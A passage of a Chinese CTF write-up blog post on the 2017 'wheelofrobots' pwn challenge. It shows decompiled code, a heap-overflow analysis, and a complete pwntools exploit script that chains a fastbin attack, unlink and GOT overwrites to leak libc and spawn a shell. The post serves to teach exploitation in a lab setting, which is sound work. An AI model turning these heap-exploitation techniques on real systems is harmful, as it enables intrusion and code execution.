choice :"</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;menu_num_buf, <span class="number">0</span>, <span class="number">4u</span>LL);</span><br><span class="line">  name_id = read_num(&amp;menu_num_buf, <span class="number">4u</span>LL);</span><br><span class="line">  result = name_id;</span><br><span class="line">  <span class="keyword">switch</span> ( name_id )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)tinny_tim_flg;</span><br><span class="line">      <span class="keyword">if</span> ( tinny_tim_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, tinny_tim, <span class="number">0x14</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)bender_flg;</span><br><span class="line">      <span class="keyword">if</span> ( bender_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, bender, <span class="number">20</span> * intelligence);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)robot_devil_flg;</span><br><span class="line">      <span class="keyword">if</span> ( robot_devil_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, robot_devil, <span class="number">20</span> * cruelty);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chain_smoker_flg;</span><br><span class="line">      <span class="keyword">if</span> ( chain_smoker_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, chain_smoker, <span class="number">0xFA0</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)billionaire_bot_flg;</span><br><span class="line">      <span class="keyword">if</span> ( billionaire_bot_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, billionaire_bot, <span class="number">0x9C40</span>uLL);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>:</span><br><span class="line">      result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)destructor_flg;</span><br><span class="line">      <span class="keyword">if</span> ( destructor_flg )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"Robot's name: "</span>);</span><br><span class="line">        result = read(<span class="number">0</span>, destructor, <span class="number">20</span> * powerful);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>前面之前在添加轮子的时候，<code>destructor</code>读取大小时没有检测数的大小，所以存在负数的情况，<code>result = read(0, destructor, 20 * powerful);</code> 这里存在任意长度的堆溢出。</p>
+</blockquote>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><ol>
+<li>首先利用<code>off_by_one</code>和<code>fastbin attack</code>,将堆块分配到<code>0x603138</code>。</li>
+<li>然后利用<code>unlink</code>将<code>0x6030E8</code>即<code>destructor</code>堆块的地址改成<code>0x6030d0</code>。</li>
+<li>通过<code>destructor</code>的堆块溢出将<code>tim</code>堆块的地址覆盖为<code>0x6030E8</code>，即<code>destructor</code>堆块地址的地址，构造一个任意地址写的漏洞。</li>
+<li>利用上面的任意地址写的漏洞，泄漏<code>libc</code>地址，进一步<code>getshell</code>。</li>
+</ol>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args == <span class="string">'DEBUG'</span>:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./wheelofrobots.dms'</span>)</span><br><span class="line">robot = ELF(<span class="string">'./wheelofrobots.dms'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_robot</span><span class="params">(index,content=<span class="number">0</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    <span class="keyword">if</span> index == <span class="number">2</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Bender's intelligence: "</span>)</span><br><span class="line">        p.sendline(str(content))</span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">3</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Robot Devil's cruelty: "</span>)</span><br><span class="line">        p.sendline(str(content))</span><br><span class="line">    <span class="keyword">elif</span> index == <span class="number">6</span>:</span><br><span class="line">        p.recvuntil(<span class="string">"Increase Destructor's powerful: "</span>)</span><br><span class="line">        p.sendline(str(content))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_robot</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_name_robot</span><span class="params">(index,name)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">"Robot's name: \n"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Your choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overflow_bender_flg</span><span class="params">(flag)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'choice :'</span>)</span><br><span class="line">    p.send(<span class="string">'6666'</span>+flag)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr, data)</span>:</span></span><br><span class="line">    change_name_robot(<span class="number">1</span>, p64(addr))</span><br><span class="line">    change_name_robot(<span class="number">6</span>, data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line"><span class="comment">#首先利用off_by_one和fastbin attack,将堆块分配到0x603138 </span></span><br><span class="line"><span class="comment">#添加bender,堆块大小为0x20*1 = 0x20</span></span><br><span class="line">    add_robot(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment">#释放bender堆块，但是delete的时候没有将堆块指针职位null,只有将bender_flg置为了0</span></span><br><span class="line">    delete_robot(<span class="number">2</span>) </span><br><span class="line"></span><br><span class="line">    overflow_bender_flg(<span class="string">'\x01'</span>)<span class="comment">#覆盖bender标识为=1</span></span><br><span class="line"><span class="comment">#修改名称时只对bender_flg进行了判断，上一步修改bender的标识为=1，修改bender堆块的fd=0x603138,此时bender堆块在fastbin中，其中data域将视为fd,bk域</span></span><br><span class="line">    change_name_robot(<span class="number">2</span>,p64(<span class="number">0x603138</span>))</span><br><span class="line"><span class="comment">#将bender_flg=0,为了再次添加bender轮子</span></span><br><span class="line">    overflow_bender_flg(<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment">#此时fastbin[0x20]-&gt;0x603138-&gt;null</span></span><br><span class="line">    add_robot(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#要在0x603138处伪造堆块，且该堆块的大小要为0x20，所以需要将0x603140处改成0x20，0x603140处为Robot</span></span><br><span class="line"><span class="comment">#Devil's cruelty，所以要再添加一个Robot Devil的轮子</span></span><br><span class="line">    add_robot(<span class="number">3</span>,<span class="number">0x20</span>)</span><br><span class="line"><span class="comment">#将tinny_tim分配到x0603138</span></span><br><span class="line">    add_robot(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#要保证robot的数量&lt;=3，前面添加的轮子数量超过3,这里不能删除tim轮子，因为后面需要通过编辑tim对的大小来实现修改destructor的大小，造成堆溢出</span></span><br><span class="line">    delete_robot(<span class="number">2</span>)</span><br><span class="line">    delete_robot(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unlink</span></span><br><span class="line"><span class="comment">#分配destructor大小为0x50,data域大小为0x40</span></span><br><span class="line">    add_robot(<span class="number">6</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#分配devil大小为0xa0,数据域为0x90</span></span><br><span class="line">    add_robot(<span class="number">3</span>,<span class="number">7</span>)</span><br><span class="line"><span class="comment">#通过编辑tim来改写destructor的size为1000</span></span><br><span class="line">    change_name_robot(<span class="number">1</span>,p64(<span class="number">1000</span>))</span><br><span class="line"><span class="comment">#构造fake_chunk</span></span><br><span class="line">    head = <span class="number">0x6030E8</span></span><br><span class="line">    playload = p64(<span class="number">0</span>)+p64(<span class="number">0x20</span>)+p64(head<span class="number">-0x18</span>)+p64(head<span class="number">-0x10</span>)+p64(<span class="number">0x20</span>)</span><br><span class="line">    playload = playload.ljust(<span class="number">0x40</span>,<span class="string">'a'</span>)</span><br><span class="line">    playload += p64(<span class="number">0x40</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line">    change_name_robot(<span class="number">6</span>,playload)</span><br><span class="line"><span class="comment">#触发unlink,此时0x6030E8地址处的值为0x6030E8-0x18，即将destructor堆块的地址改成0x6030d0</span></span><br><span class="line">    delete_robot(<span class="number">3</span>)</span><br><span class="line">  <span class="comment">#  gdb.attach(p)</span></span><br><span class="line"><span class="comment">#通过destructor的堆块溢出将tim堆块的地址覆盖为0x6030E8,即destructor堆块地址的地址</span></span><br><span class="line">    playload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span> * <span class="number">0x18</span> + p64(<span class="number">0x6030E8</span>)</span><br><span class="line"><span class="comment">#0x6030d0+0x10+0x18 = 0x6030F8</span></span><br><span class="line">    change_name_robot(<span class="number">6</span>,playload)</span><br><span class="line"><span class="comment">#将exit的地址改成ret的地址</span></span><br><span class="line">    write(robot.got[<span class="string">'exit'</span>],p64(<span class="number">0x4015bc</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#将轮子数改成3</span></span><br><span class="line">    write(<span class="number">0x603130</span>,p64(<span class="number">3</span>)) </span><br><span class="line"><span class="comment">#将destructor堆块的指针改成puts@got</span></span><br><span class="line">    change_name_robot(<span class="number">1</span>,p64(robot.got[<span class="string">'puts'</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">   <span class="comment"># print p.recv()</span></span><br><span class="line">    p.recvuntil(<span class="string">'New hands great!! Thx '</span>)</span><br><span class="line"><span class="comment">#获取libc地址</span></span><br><span class="line">    puts_addr = p.recvuntil(<span class="string">'!\n'</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    puts_addr = u64(puts_addr)</span><br><span class="line"></span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    binsh_addr = libc_base + next(libc.search(<span class="string">'/bin/sh'</span>))</span><br><span class="line"><span class="comment">#将free@got的内容改成system地址</span></span><br><span class="line">    write(robot.got[<span class="string">'free'</span>], p64(system_addr)) </span><br><span class="line">    write(<span class="number">0x6030E8</span>, p64(binsh_addr))</span><br><span class="line"></span><br><span class="line">    delete_robot(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
+<p><strong>参考</strong></p>
+<p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></p>
+<p><a href="https://hiziriai.hatenablog.com/entry/2018/12/19/230049" target="_blank" rel="noopener">https://hiziriai.hatenablog.com/entry/2018/12/19/230049</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    v1cky01dxp
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://v1ckydxp.github.io/archives/2019/06/27/2017_wheelofrobots/" title="2017 wheelofrobots -unlink writeup">https://v1ckydxp.github.io/archives/2019/06/27/2017_wheelofrobots/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://v1ckydxp.github.io" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn-unlink/" rel="tag"># pwn-unlink</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/06/25/2016_zctf_note2-writeup/" rel="next" title="2016_zctf_note2 writeup">
+                <i class="fa fa-chevron-left"></i> 2016_zctf_note2 writeup
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/28/2019-kctf-沉睡的敦煌-writeup/" rel="prev" title="2019 kctf 沉睡的敦煌 writeup">
+                2019 kctf 沉睡的敦煌 writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">v1cky01dxp</p>
+	      <img class="site-author-image" itemprop="image" src="/images/head.jpeg" alt="v1cky01dxp">
+	      <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">16</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/v1ckydxp" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:sunshinedxp@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#程序基本信息"><span class="nav-number">1.</span> <span class="nav-text">程序基本信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#程序代码逻辑分析"><span class="nav-number">2.</span> <span class="nav-text">程序代码逻辑分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#变量"><span class="nav-number">2.1.</span> <span class="nav-text">变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#add-wheel（）"><span class="nav-number">2.2.</span> <span class="nav-text">add_wheel（）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#delete-robot"><span class="nav-number">2.3.</span> <span class="nav-text">delete_robot()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#change-name-robot"><span class="nav-number">2.4.</span> <span class="nav-text">change_name_robot()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#利用思路"><span class="nav-number">3.</span> <span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">v1cky01dxp</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">35.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
